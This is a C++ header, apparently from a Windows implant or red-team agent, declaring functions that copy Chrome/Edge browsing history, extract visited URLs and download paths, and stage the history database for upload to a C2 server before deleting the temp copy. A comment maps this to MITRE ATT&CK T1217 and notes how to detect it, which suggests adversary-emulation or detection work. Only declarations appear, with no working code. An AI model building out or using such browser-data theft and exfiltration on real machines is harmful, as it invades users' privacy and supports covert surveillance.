#pragma once
#ifndef BROWSERHISTORY_H
#define BROWSERHISTORY_H
#include "common.h"

namespace BrowserHistory {
    // Copy Chrome/Edge History SQLite and raw-scan for URLs.
    // Detection: non-browser process reading Default\History = T1217 Browser Information Discovery.
    std::string Urls(int maxRows = 60);

    // Scan the same History DB for local file-system download paths (C:\...).
    std::string Downloads(int maxRows = 40);

    // Upload the raw History database to C2 for offline analysis.
    // Returns the temp file path — caller must UploadFile() then DeleteFileA() it.
    std::string HistoryDbPath();
}

#endif
